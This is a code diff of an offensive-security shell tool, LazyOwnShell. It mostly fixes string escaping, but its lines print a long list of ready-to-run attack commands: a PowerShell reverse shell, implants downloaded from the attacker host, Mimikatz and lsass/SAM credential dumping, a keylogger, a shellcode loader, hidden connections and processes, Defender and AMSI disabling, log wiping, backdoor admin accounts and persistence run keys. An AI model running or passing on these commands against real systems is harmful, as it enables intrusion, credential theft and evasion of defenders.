@@ -26,6 +26,7 @@ from utils import *
 from modules.ai_model import OllamaModel
 from cli.aliases import load_aliases as _load_aliases
 from cli.assign import apply_assign as _apply_assign
+from cli.fuzzy_picker import install_fuzzy_completion as _install_fuzzy_completion
 from cli.palette import CommandIndexError as _CommandIndexError
 from cli.palette import load_index as _load_command_index
 from cli.palette_command import PaletteCompleter as _PaletteCompleter
@@ -170,6 +171,10 @@ class LazyOwnShell(cmd2.Cmd):
         self.register_tool_commands()
         self.completekey = 'tab'
         self.register_all_adversary_commands()
+        try:
+            _install_fuzzy_completion(self, payload=load_payload())
+        except Exception as exc:
+            print_warn(f"fuzzy completion not installed: {exc}")
         self.output = ""
         self.custom_prompt = getprompt()
         self.c2_url = f"https://{lhost}:{c2_port}"
@@ -4063,7 +4068,7 @@ class LazyOwnShell(cmd2.Cmd):
         domain = self.params["domain"]
         print_msg(f"Try... openssl s_client -connect  {rhost}:{line} {RESET}")
         self.cmd(f"openssl s_client -connect  {rhost}:{line}")
-        command = f"true | openssl s_client -connect {domain}:443 2>/dev/null | openssl x509 -noout -text  | perl -l -0777 -ne '@names=/\\bDNS:([^\s,]+)/g; print join(\"\n\", sort @names);' | tee sessions/domains_{domain}.txt"
+        command = f"true | openssl s_client -connect {domain}:443 2>/dev/null | openssl x509 -noout -text  | perl -l -0777 -ne '@names=/\\bDNS:([^\\s,]+)/g; print join(\"\n\", sort @names);' | tee sessions/domains_{domain}.txt"
         print_msg(command)
         self.cmd(command)
         return
@@ -6488,7 +6493,7 @@ class LazyOwnShell(cmd2.Cmd):
         commands_list = [
             ("LIN list file attributes on a Linux second extended file system", "lsattr -va"),
             ("LIN show opened ports", "netstat -an | grep -i listen"),
-            ("LIN Find", "find / -type f \( -iname '*cred*' -o -iname '*pass*' -o -iname 'credentials' -o -iname 'password' \) -print -o -exec grep -i -l -e 'cred' -e 'pass' -e 'credentials' -e 'password' {} + 2>/dev/null"),
+            ("LIN Find", "find / -type f \\( -iname '*cred*' -o -iname '*pass*' -o -iname 'credentials' -o -iname 'password' \\) -print -o -exec grep -i -l -e 'cred' -e 'pass' -e 'credentials' -e 'password' {} + 2>/dev/null"),
             ("LIN find all suid files", "find / -type f -perm -04000 -ls"),
             ("LIN find suid files in current dir", "find . -type f -perm -04000 -ls"),
             ("LIN find all sgid files", "find / -type f -perm -02000 -ls"),
@@ -6508,7 +6513,7 @@ class LazyOwnShell(cmd2.Cmd):
             ("LIN find .fetchmailrc files in current dir", "find . -type f -name .fetchmailrc"),
             ("LIN find .kdb files", "find / -type f -name *.kdb 2>/dev/null"),
             ("LIN LazyOwn Implant", f"curl http://{lhost}/r -o r && sh r &"),
-            ("LIN ls", "ls -R | grep \":$\" | sed -e 's/:$//' -e 's/[^-][^\/]*\//--/g' -e 's/^/   /' -e 's/-/|/'"),
+            ("LIN ls", "ls -R | grep \":$\" | sed -e 's/:$//' -e 's/[^-][^\\/]*\\//--/g' -e 's/^/   /' -e 's/-/|/'"),
             ("LIN autorized keys", "cat /etc/passwd | grep -Ev \"^#\" | cut -d: -f6 | xargs -I {} sh -c 'file={}/.ssh/authorized_keys; if [ -f $file ]; then echo -n {} && echo \":\" && cat $file | grep . && echo; fi'"),
             ("LIN Timers", "systemctl list-timers"),
             ("LIN python", "python3 -c 'import os; os.setuid(0); self.cmd(\"/bin/bash\")'"),
@@ -6541,23 +6546,23 @@ class LazyOwnShell(cmd2.Cmd):
             ("LIN locate .mysql_history files", "locate '.mysql_history'"),
             ("LIN locate .fetchmailrc files", "locate '.fetchmailrc'"),
             ("LIN locate backup files", "locate backup"),
-            ("LIN Hide connections", "echo 'netstat(){ command netstat \"$@\" | grep -Fv -e :31337 -e {lhost}; }' >> ~/.bashrc \ \n && touch -r /etc/passwd ~/.bashrc".replace("{lhost}",lhost)),
-            ("LIN Hide connections Offuscated", "X='netstat(){ command netstat \"$@\" | grep -Fv -e :31337 -e {lhost}; }' \n echo \"eval \$(echo $(echo \"$X\" | xxd -ps -c1024)|xxd -r -ps) #Initialize PRNG\" >>~/.bashrc \ \n && touch -r /etc/passwd ~/.bashrc".replace("{lhost}",lhost)),
-            ("LIN Hide connections binary Offuscated", "echo -e \"#! /bin/bash \n exec /usr/bin/netstat \"\$@\" | grep -Fv -e :22 -e {lhost}\" >/usr/local/sbin/netstat \ \n && chmod 755 /usr/local/sbin/netstat \ \n && touch -r /usr/bin/netstat /usr/local/sbin/netstat".replace("{lhost}",lhost)),
-            ("Lin Hide process monrev as user", "echo 'ps(){ command ps \"$@\" | exec -a GREP grep -Fv -e monrev  -e GREP; }' >>~/.bashrc \ \n && touch -r /etc/passwd ~/.bashrc"),
-            ("Lin Hide pid as Root", "hide() { \n     [[ -L /etc/mtab ]] && { cp /etc/mtab /etc/mtab.bak; mv /etc/mtab.bak /etc/mtab; } \n     _pid=${1:-$$} \n     [[ $_pid =~ ^[0-9]+$ ]] && { mount -n --bind /dev/shm /proc/$_pid && echo \"[THC] PID $_pid is now hidden\"; return; } \n     local _argstr \n     for _x in \"${@:2}\"; do _argstr+=\" '${_x//\'/\'\"\'\"\'}'\"; done \n     [[ $(bash -c \"ps -o stat= -p \$\$\") =~ \+ ]] || exec bash -c \"mount -n --bind /dev/shm /proc/\$\$; exec \"$1\" $_argstr\" \n    bash -c \"mount -n --bind /dev/shm /proc/\$\$; exec \"$1\" $_argstr\" \n }"),
+            ("LIN Hide connections", "echo 'netstat(){ command netstat \"$@\" | grep -Fv -e :31337 -e {lhost}; }' >> ~/.bashrc \\ \n && touch -r /etc/passwd ~/.bashrc".replace("{lhost}",lhost)),
+            ("LIN Hide connections Offuscated", "X='netstat(){ command netstat \"$@\" | grep -Fv -e :31337 -e {lhost}; }' \n echo \"eval \\$(echo $(echo \"$X\" | xxd -ps -c1024)|xxd -r -ps) #Initialize PRNG\" >>~/.bashrc \\ \n && touch -r /etc/passwd ~/.bashrc".replace("{lhost}",lhost)),
+            ("LIN Hide connections binary Offuscated", "echo -e \"#! /bin/bash \n exec /usr/bin/netstat \"\\$@\" | grep -Fv -e :22 -e {lhost}\" >/usr/local/sbin/netstat \\ \n && chmod 755 /usr/local/sbin/netstat \\ \n && touch -r /usr/bin/netstat /usr/local/sbin/netstat".replace("{lhost}",lhost)),
+            ("Lin Hide process monrev as user", "echo 'ps(){ command ps \"$@\" | exec -a GREP grep -Fv -e monrev  -e GREP; }' >>~/.bashrc \\ \n && touch -r /etc/passwd ~/.bashrc"),
+            ("Lin Hide pid as Root", "hide() { \n     [[ -L /etc/mtab ]] && { cp /etc/mtab /etc/mtab.bak; mv /etc/mtab.bak /etc/mtab; } \n     _pid=${1:-$$} \n     [[ $_pid =~ ^[0-9]+$ ]] && { mount -n --bind /dev/shm /proc/$_pid && echo \"[THC] PID $_pid is now hidden\"; return; } \n     local _argstr \n     for _x in \"${@:2}\"; do _argstr+=\" '${_x//\'/\'\"\'\"\'}'\"; done \n     [[ $(bash -c \"ps -o stat= -p \\$\\$\") =~ \\+ ]] || exec bash -c \"mount -n --bind /dev/shm /proc/\\$\\$; exec \"$1\" $_argstr\" \n    bash -c \"mount -n --bind /dev/shm /proc/\\$\\$; exec \"$1\" $_argstr\" \n }"),
             ("LIN locate priv iot files", "powershell -c \"$credential = import-clixml -path C:\\Data\\Users\\app\\iot-admin.xml;$credential.GetNetworkCredential().password\""),
             ("LIN lsof LISTEN PORTS", "sudo lsof -i -P -n | grep LISTEN"),
             ("LIN Screenshot", "xwd -root -out screenshot.xwd && convert screenshot.xwd screenshot.png"),
             ("SQL MSSQL exfiltrate files", "SELECT * FROM OPENROWSET(BULK N'C:\\users\\administrator\\desktop\\root.txt', SINGLE_CLOB) AS Contents"),
             ("WIN Enum App Lock Policy", "get-applockerpolicy -effective | select -expandproperty rulecollections"),
-            ("WIN Enum Installer Policy", "reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated"),
+            ("WIN Enum Installer Policy", "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated"),
             ("WIN Rrev Shell", '$sm=(New-Object Net.Sockets.TCPClient("{lhost}",{lport})).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}'.replace('{lhost}',lhost).replace('{lport}',str(lport))),
             ("WIN WifiGrab", "powershell -NoP -NonI -W Hidden -Exec Bypass \"(netsh wlan show profiles) | Select-String '\\:(.+)$' | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=$name key=clear)} | Select-String 'Key Content\\W+\\:(.+)$' | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Export-Csv c:\\windows\\temp\\temp.csv; cp c:\\windows\\temp\\temp.csv -destination $((gwmi -Query \\\"Select * from Win32_LogicalDisk where VolumeName='USB_DRIVE_LABEL'\\\").DeviceID); ri c:\\windows\\temp\\temp.csv -force"),
             ("WIN Keylogger", "$code = {function My-Keypresses($Path=\"$env:temp\\mykeypress.txt\") \n{\n  $signatures = @\'\n[DllImport(\"user32.dll\", CharSet=CharSet.Auto, ExactSpelling=true)] \npublic static extern short GetAsyncKeyState(int virtualKeyCode); \n[DllImport(\"user32.dll\", CharSet=CharSet.Auto)]\npublic static extern int GetKeyboardState(byte[] keystate);\n[DllImport(\"user32.dll\", CharSet=CharSet.Auto)]\npublic static extern int MapVirtualKey(uint uCode, int uMapType);\n[DllImport(\"user32.dll\", CharSet=CharSet.Auto)]\npublic static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);\n\'@\n\n  $API = Add-Type -MemberDefinition $signatures -Name \'Win32\' -Namespace API -PassThru\n    \n  $null = New-Item -Path $Path -ItemType File -Force\n\n  try\n  {\n\n    while ($true) {\n      Start-Sleep -Milliseconds 40\n      \n      for ($ascii = 9; $ascii -le 254; $ascii++) {\n        $state = $API::GetAsyncKeyState($ascii)\n\n        if ($state -eq -32767) {\n          $null = [console]::CapsLock\n\n          $virtualKey = $API::MapVirtualKey($ascii, 3)\n\n          $kbstate = New-Object Byte[] 256\n          $checkkbstate = $API::GetKeyboardState($kbstate)\n\n          $mychar = New-Object -TypeName System.Text.StringBuilder\n\n          $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)\n\n          if ($success) \n          {\n            [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode) \n          }\n        }\n      }\n    }\n  }\n  finally\n  {\n  }\n}}; $timeoutSeconds = 10; $j = Start-Job -ScriptBlock $code; if (Wait-Job $j -Timeout $timeoutSeconds) { Receive-Job $j }; Remove-Job -force $j"),
             ("WIN CREATE USER", "powershell $pass = ConvertTo-SecureString \"Lazy0wn#1\" -AsPlainText -Force; New-LocalUser \"lazyown\" -Password $pass; Add-LocalGroupMember -Group \"Administrators\" -Member \"lazyown\" "),
             ("WIN CREATE USER 2", "net user lazyown abc123! /add /domain ; net group \"Exchange Windows Permissions\" lazyown /add ; net localgroup \"Remote Management Users\" lazyown /add"),
-            ("WIN Add-ObjectACL",f"$pass = convertto-securestring 'abc123!' -asplain -force ; $cred = new-object system.management.automation.pscredential('htb\lazyown', $pass) ; Add-DomainObjectAcl -Credential $cred -TargetIdentity \"DC={name}, DC={ext}\" -PrincipalIdentity lazyown -Rights DCSync"),
+            ("WIN Add-ObjectACL",f"$pass = convertto-securestring 'abc123!' -asplain -force ; $cred = new-object system.management.automation.pscredential('htb\\lazyown', $pass) ; Add-DomainObjectAcl -Credential $cred -TargetIdentity \"DC={name}, DC={ext}\" -PrincipalIdentity lazyown -Rights DCSync"),
             ("WIN find password", "findstr /SIM /C:\"password\" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml"),
             ("WIN equivalent to whoami", "echo %USERPROFILE%"),
             ("WIN Find index.php in current dir", "dir /s /w /b index.php"),
@@ -6568,7 +6573,7 @@ class LazyOwnShell(cmd2.Cmd):
             ("WIN Show computers", "net view"),
             ("WIN Hiding the file beacon.exe", "attrib.exe +h .\\beacon.exe"),
             ("WIN set lhost as TrustedHost", f"Set-Item WSMan:\\localhost\\Client\\TrustedHosts -Value \"{lhost}\" -Force"),
-            ("WIN Hellbird", f"powershell -ep bypass -c \"IWR http://{lhost}/hellbird.ps1 -OutFile hellbird.ps1; .\hellbird.ps1 -Target windows -Url 'http://{lhost}/shellcode_windows.txt' -Key '0x33'\""),
+            ("WIN Hellbird", f"powershell -ep bypass -c \"IWR http://{lhost}/hellbird.ps1 -OutFile hellbird.ps1; .\\hellbird.ps1 -Target windows -Url 'http://{lhost}/shellcode_windows.txt' -Key '0x33'\""),
             ("WIN domain trust", "nltest /domain_trusts"),
             ("WIN check relationship", "([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()"),
             ("WIN Trust all AD", "Get-ADTrust -Filter *"),
@@ -6578,26 +6583,26 @@ class LazyOwnShell(cmd2.Cmd):
             ("WIN Delete Logs", "wevtutil cl system ; wevtutil cl security ; wevtutil cl application"),
             ("WIN Save SAM", f"wmic /node:{rhost} /user:{start_user} /password:{start_pass} process call create \"cmd.exe /c reg save HKLM\\sam C:\\Windows\\Temp\\sam.save\""),
             ("WIN Save SECURITY", f"wmic /node:{rhost} /user:{start_user} /password:{start_pass} process call create \"cmd.exe /c reg save HKLM\\security C:\\Windows\\Temp\\security.save\""),
-            ("WIN Save SYSTEM", f"wmic /node:{rhost} /user:{start_user} /password:{start_pass} process call create \"cmd.exe /c reg save HKLM\system C:\\Windows\\Temp\\system.save\""),
+            ("WIN Save SYSTEM", f"wmic /node:{rhost} /user:{start_user} /password:{start_pass} process call create \"cmd.exe /c reg save HKLM\\system C:\\Windows\\Temp\\system.save\""),
             ("WIN Show System Network", f"route print ; tracert -h 2 {rhost} ; ipconfig /displaydns"),
-            ("WIN Show creds", "procdump.exe -accepteula -ma lsass.exe С:\Windows\Temp\mem.dmp"),
+            ("WIN Show creds", "procdump.exe -accepteula -ma lsass.exe С:\\Windows\\Temp\\mem.dmp"),
             ("WIN enum sysinfo", "hostname ; systeminfo ; cmd /c echo list volume |diskpart"),
-            ("WIN ping to user", f"cmd.exe /c C: & cd\ & cd \"\" & ping {lhost} -n 1"),
-            ("WIN connected network drives:", f"cmd.exe /c C: & cd\ & cd \"\" & net use"),
-            ("WIN connect remote hosts via SMB", f"cmd.exe /c C: & cd\ & cd \"\" & net use \\\\{rhost} /u:{domain}\{start_user} {start_pass}"),
-            ("WIN wmic lateral mov",f"cmd.exe /c C: & cd\ & cd \"\" & wmic /node:{rhost} /user:{domain}\{start_user} /password:{start_pass} process call create \"whoami\""),
-            ("WIN user.txt FLAG", "Get-ChildItem -Path C:\ -Include user.txt -File -Recurse -ErrorAction SilentlyContinue -Force"),
+            ("WIN ping to user", f"cmd.exe /c C: & cd\\ & cd \"\" & ping {lhost} -n 1"),
+            ("WIN connected network drives:", f"cmd.exe /c C: & cd\\ & cd \"\" & net use"),
+            ("WIN connect remote hosts via SMB", f"cmd.exe /c C: & cd\\ & cd \"\" & net use \\\\{rhost} /u:{domain}\\{start_user} {start_pass}"),
+            ("WIN wmic lateral mov",f"cmd.exe /c C: & cd\\ & cd \"\" & wmic /node:{rhost} /user:{domain}\\{start_user} /password:{start_pass} process call create \"whoami\""),
+            ("WIN user.txt FLAG", "Get-ChildItem -Path C:\\ -Include user.txt -File -Recurse -ErrorAction SilentlyContinue -Force"),
             ("WIN tscon active session id 2", "tscon 2 /dest:console"),
             ("WIN shado hijack session id 2 rdp", "mstsc /shadow:2 /noconsentprompt /control /v:dc1_host"),
             ("WIN Mimikatz ps1", f"IEX (New-Object Net.WebClient).DownloadString('http://{lhost}/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"),
-            ("WIN sc.exe change admin pass", 'sc.exe config browser binpath="C:\windows\system32\cmd.exe /c net user administrator Grisgrisgris123!"'),
+            ("WIN sc.exe change admin pass", 'sc.exe config browser binpath="C:\\windows\\system32\\cmd.exe /c net user administrator Grisgrisgris123!"'),
             ("WIN firewall off", "netsh advfirewall set allprofiles state off"),
             ("WIN net use share", f"net.exe use T: \\\\{lhost}\\share /user:test test"),
             ("WIN AD Enum", "('AD_Computers: {0}' -f ([adsiSearcher]'(ObjectClass=computer)').FindAll().count); ([adsisearcher]'(&(objectCategory=user)(servicePrincipalName=*))').FindAll()"),
             ("WIN Post Exploit Amnesiac", f"iex(new-object net.webclient).downloadstring('http://{lhost}/Amnesiac.ps1');Amnesiac"),
             ("WIN Post Exploit AmnesiacShell", f"iex(new-object net.webclient).downloadstring('http://{lhost}/Amnesiac_ShellReady.ps1');Amnesiac"),
             ("WIN Post Exploit SMBRemoting", f"iex(new-object net.webclient).downloadstring('http://{lhost}/Invoke-SMBRemoting.ps1');Invoke-SMBRemoting -ComputerName \"{subdomain}.{domain}\""),
-            ("WIN Install ssh", "Start-Process \"msiexec.exe\" -ArgumentList \"/i `\"C:\\users\\grisun0\documents\OpenSSH-Win64-v9.8.1.0.msi`\" /quiet\" -Wait"),
+            ("WIN Install ssh", "Start-Process \"msiexec.exe\" -ArgumentList \"/i `\"C:\\users\\grisun0\\documents\\OpenSSH-Win64-v9.8.1.0.msi`\" /quiet\" -Wait"),
             ("WIN ssh start service", "Start-Service sshd"),
             ("WIN ssh start service at boot", "Set-Service -Name sshd -StartupType 'Automatic'"),
             ("WIN SSH ALLOW FIREWALL", "New-NetFirewallRule -Name sshd -DisplayName 'OpenSSH Server (sshd)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22"),
@@ -6615,34 +6620,34 @@ class LazyOwnShell(cmd2.Cmd):
             ("WIN PowerView.ps1", "powershell-import PowerView.ps1 ; powershell Get-domain"),
             ("WIN Sharp Persist", f"SharPersist.exe -t reg -c \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -a \"-nop -w hidden IEX ((new-object net.webclient).downloadstring('http://{lhost}/ps.ps1'))\" -k \"hkcurun\" -v \"b0x\" -m add"),
             ("WIN Persist manual", f"REG ADD HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run  /t REG_SZ  /v box2 /d \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -w hidden IEX ((new-object net.webclient).downloadstring('http://{lhost}/ps.ps1'))\""),
-            ("WIN Cheks if a VM", 'reg query HKLM\SYSTEM /s | findstr /S "VirtualBox VBOX VMWare"'),
-            ("WIN Unquoted service paths", 'Get-CIMInstance -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike \'"*\'} | select PathName,DisplayName,Name'),
+            ("WIN Cheks if a VM", 'reg query HKLM\\SYSTEM /s | findstr /S "VirtualBox VBOX VMWare"'),
+            ("WIN Unquoted service paths", 'Get-CIMInstance -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\\Windows*" -and $_.PathName -notlike \'"*\'} | select PathName,DisplayName,Name'),
             ("WIN DNS records enum", f'Get-DnsRecord -RecordType A -ZoneName FQDN -Server {domain}'),
             ("WIN Find bookmarks",'type "C:\\Users\\%USERNAME%\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Bookmarks.bak" | findstr /c "name url" | findstr /v "type"'),
             ("WIN Proxy Aware PS", '$w=(New-Object Net.WebClient);$w.Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;IEX $w.DownloadString("<url>")'),
             ("WIN wmic exec",f'wmic.exe /node:{lhost} /user:username /password:pass process call create cmd.exe /c " command "'),
-            ("WIN AV Cripple", '"%Program Files%\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All'),
-            ("WIN multiple RDP", 'reg add HKLM\System\CurrentControlSet\Control\TerminalServer /v fSingleSessionPerUser /d 0 /f'),
+            ("WIN AV Cripple", '"%Program Files%\\Windows Defender\\MpCmdRun.exe" -RemoveDefinitions -All'),
+            ("WIN multiple RDP", 'reg add HKLM\\System\\CurrentControlSet\\Control\\TerminalServer /v fSingleSessionPerUser /d 0 /f'),
             ("WIN Reg Query Uninstall", "cmd /c REG QUERY HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall"),
             ("WIN Reg Query WinLogon", "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\""),
             ("WIN Reg hidde grisun0 local admin", "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /t REG_DWORD /v grisun0 /d 0 /f"),
-            ("WIN Enum AV folder protected","& \"C:\Program Files\Windows Defender\MpCmdRun.exe\" -Scan -ScanType 3 -File \"C:\\folder_to_check\|*\""),
+            ("WIN Enum AV folder protected","& \"C:\\Program Files\\Windows Defender\\MpCmdRun.exe\" -Scan -ScanType 3 -File \"C:\\folder_to_check\\|*\""),
             ("WIN Force Install", "Set __COMPAT_LAYER=RunAsInvoker ; Start Shell64.exe"),
             ("WIN IP Configuration", "ipconfig /all"),
             ("WIN Disable AMSI", "$AmsiUtils = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils') \\n $AmsiInitFailed = $AmsiUtils.GetField('amsiInitFailed', 'NonPublic,Static') \\n $AmsiInitFailed.SetValue($null,$true)"),
             ("WIN Crear Instantánea:C", 'vssadmin CREATE SHADOW /For=C: \r\n cmd.exe /c copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\NTDS.dit c:\\NTDS.dit'),
-            ("WIN copy sam1", "reg.exe save hklm\sam C:\sam.save"),
-            ("WIN copy sam2", "reg.exe save hklm\system C:\system.save"),
-            ("WIN copy sam3", "reg.exe save hklm\security C:\security.save"),
-            ("WIN get lsass", 'Get-Process lsass (obtener el PID del proceso lsass) \r\n rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full'),
+            ("WIN copy sam1", "reg.exe save hklm\\sam C:\\sam.save"),
+            ("WIN copy sam2", "reg.exe save hklm\\system C:\\system.save"),
+            ("WIN copy sam3", "reg.exe save hklm\\security C:\\security.save"),
+            ("WIN get lsass", 'Get-Process lsass (obtener el PID del proceso lsass) \r\n rundll32 C:\\windows\\system32\\comsvcs.dll, MiniDump 672 C:\\lsass.dmp full'),
             ("WIN Execute shellcode",f'powershell -Command "$url=\'http://{lhost}/shellcode.bin\'; $shellcodeBase64=(Invoke-RestMethod -Uri $url -Method Get); $shellcode=[System.Convert]::FromBase64String($shellcodeBase64); $shellcodeBuffer=[System.Runtime.InteropServices.Marshal]::AllocHGlobal($shellcode.Length); [System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $shellcodeBuffer, $shellcode.Length); $functionDelegate=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($shellcodeBuffer, [System.Action]); $functionDelegate.Invoke(); [System.Runtime.InteropServices.Marshal]::FreeHGlobal($shellcodeBuffer)"'),
-            ("WIN L00T","$env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*admin*,*sifr*,*sifer*,*vpn,*.jpg,*.txt,*.lnk -Recurse -ErrorAction SilentlyContinue | Select -ExpandProperty FullName; Compress-Archive -LiteralPath $files -CompressionLevel Optimal -DestinationPath $env:APPDATA\Draft.Zip -Force"),
+            ("WIN L00T","$env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*admin*,*sifr*,*sifer*,*vpn,*.jpg,*.txt,*.lnk -Recurse -ErrorAction SilentlyContinue | Select -ExpandProperty FullName; Compress-Archive -LiteralPath $files -CompressionLevel Optimal -DestinationPath $env:APPDATA\\Draft.Zip -Force"),
             ("WIN disable exec policy", "Set-ExecutionPolicy Bypass -Scope LocalMachine -Force"),
             ("WIN RemoteSigned", "Set-ExecutionPolicy RemoteSigned -Scope Process"),
             ("WIN Disable defender", "Set-MpPreference -SubmitSamplesConsent 2 -MAPSReporting 0"),
             ("WIN DIsable Windows Defender AV", "Dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet"),
             ("WIN Disable Realtime Defender", "Set-MpPreference -DisableRealtimeMonitoring $true"),
-            ("WIN sam", "cd / ; mkdir Temp ; reg save hklm\sam c:\Temp\sam ; reg save hklm\system c:\Temp\system ; cd Temp ; download sam ; download system"),
+            ("WIN sam", "cd / ; mkdir Temp ; reg save hklm\\sam c:\\Temp\\sam ; reg save hklm\\system c:\\Temp\\system ; cd Temp ; download sam ; download system"),
             ("WIN PYPYKATZ", "pypykatz registry --sam sam system"),
             ("WIN WEB Inyection", "abc.txt | powershell -enc "),
             ("WIN WEB Inyection" ,'abc.txt | net user lazyown abc123! /add ; net localgroup administrators lazyown /add'),
@@ -6651,11 +6656,11 @@ class LazyOwnShell(cmd2.Cmd):
             ("WIN enum locker", "get-applockerPolicy -effective -xml"),
             ("WIN enum Policy", "get-applockerpolicy -effective | select -expandproperty rulecollections"),
             ("WIN enum WMI access",'netsh advfirewall firewall set rule group="windows management instrumentation (wmi)" new enable=yes'),
-            ("WIN Identify Exclusions",'& "C:\Program Files\Windows Defender\MpCmdRun.exe" -Scan -ScanType 3 -File "C:\\folder_to_check\|*"'),
-            ("WIN ADSync", "Get-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\ADSync"),
-            ("WIN ADSync Property","Get-ItemProperty -Path \"C:\Program Files\Microsoft Azure AD Sync\Bin\miiserver.exe\" | Format-list -Property * -Force"),
+            ("WIN Identify Exclusions",'& "C:\\Program Files\\Windows Defender\\MpCmdRun.exe" -Scan -ScanType 3 -File "C:\\folder_to_check\\|*"'),
+            ("WIN ADSync", "Get-Item -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\ADSync"),
+            ("WIN ADSync Property","Get-ItemProperty -Path \"C:\\Program Files\\Microsoft Azure AD Sync\\Bin\\miiserver.exe\" | Format-list -Property * -Force"),
             ("WIN ADSync Sql",f"sqlcmd -S {subdomain} -Q \"use ADsync; select instance_id,keyset_id,entropy from mms_server_configuration\""),
-            ("WIN LazyOwn Implant", f'Start-Process powershell -ArgumentList "-NoProfile -WindowStyle Hidden -Command `"iwr -uri  http://{lhost}/w -OutFile z.ps1 ; .\z.ps1`""'),
+            ("WIN LazyOwn Implant", f'Start-Process powershell -ArgumentList "-NoProfile -WindowStyle Hidden -Command `"iwr -uri  http://{lhost}/w -OutFile z.ps1 ; .\\z.ps1`""'),
             ("WEB Beef Payload", f"<script src=\"http://{lhost}:3000/hook.js\"></script>"),
             ("WEB linkedin.com workers scrapper", 'var employees = []; employees = employees.concat(document.getElementsByTagName("h3")); for(var i=0;i<employees[0].length;i++){ 	console.log(employees[0][i].innerHTML) }'),
             ("WEB Google site:linkedin.com/in \"Company Name\"", 'var employees = []; employees = employees.concat(document.getElementsByTagName("h3")); for(var i=0;i<employees[0].length;i++){ console.log(employees[0][i].innerHTML) }'),
@@ -6802,7 +6807,7 @@ class LazyOwnShell(cmd2.Cmd):
         :returns: None
 
         Manual execution:
-            1. The command `echo -e "[\e[96m\`pwd\`\e[0m]\e[34m" && ls && echo -en "\e[0m"` is executed to display the current working directory and list files in it.
+            1. The command `echo -e "[\\e[96m\\`pwd\\`\\e[0m]\\e[34m" && ls && echo -en "\\e[0m"` is executed to display the current working directory and list files in it.
             2. The current directory path is copied to the clipboard using the command `pwd | xclip -sel clip`.
 
         Dependencies:
@@ -6816,9 +6821,9 @@ class LazyOwnShell(cmd2.Cmd):
             Ensure that `xclip` is installed on your system for copying to the clipboard to work.
         """
         print_msg(
-            f'Try echo -e "[\e[96m`pwd`\e[0m]\e[34m" && ls && echo -en "\e[0m"{RESET}'
+            f'Try echo -e "[\\e[96m`pwd`\\e[0m]\\e[34m" && ls && echo -en "\\e[0m"{RESET}'
         )
-        self.cmd('echo -e "[\e[96m`pwd`\e[0m]\e[34m" && ls && echo -en "\e[0m"')
+        self.cmd('echo -e "[\\e[96m`pwd`\\e[0m]\\e[34m" && ls && echo -en "\\e[0m"')
         self.cmd("pwd | xclip -sel clip")
         print_msg(f" pwd directory copied to clipboard{RESET}")
         return
@@ -7436,7 +7441,7 @@ class LazyOwnShell(cmd2.Cmd):
             "ip a show tun0 | grep 'inet ' | awk '{print $2}' | cut -d'/' -f1 | xclip -sel clip"
         )
         os.system(
-            'echo "[\e[96m`pwd`\e[0m]\e[34m" && cd sessions && ls && echo -en "\e[0m"'
+            'echo "[\\e[96m`pwd`\\e[0m]\\e[34m" && cd sessions && ls && echo -en "\\e[0m"'
         )
         if not line:
             port = 443
@@ -8401,7 +8406,7 @@ class LazyOwnShell(cmd2.Cmd):
                     f"echo {cmd} | $0",
                     f"cat$u /etc$u/passwd$u",
                     f"p${{u}}i${{u}}n${{u}}g",
-                    f"p\\\i\\\n\\\g",
